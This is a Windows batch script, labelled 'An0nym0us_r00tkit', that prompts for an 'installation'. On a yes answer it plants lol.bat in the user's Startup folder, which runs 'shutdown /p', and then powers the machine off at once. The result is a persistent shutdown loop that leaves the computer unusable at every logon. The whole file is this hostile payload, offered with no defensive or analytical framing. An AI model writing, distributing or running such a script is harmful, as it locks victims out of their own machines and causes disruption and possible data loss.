@echo off
title An0nym0us_r00tkit
GOTO choice

:start
cd /d "%systemdrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo @echo off > lol.bat
echo shutdown /p >>lol.bat
shutdown /p
break

:choice
color 0f
echo Do you want to begin the An0nym0us_r00tkit installation?[Yes/No]
set /p input=
if %input%==Y goto start
if %input%==y goto start
if %input%==yes goto start
if %input%==YES goto start
if %input%==Yes goto start
if %input%==N goto end
if %input%==n goto end
if %input%==no goto end
if %input%==NO goto end
if %input%==No goto end

:end
break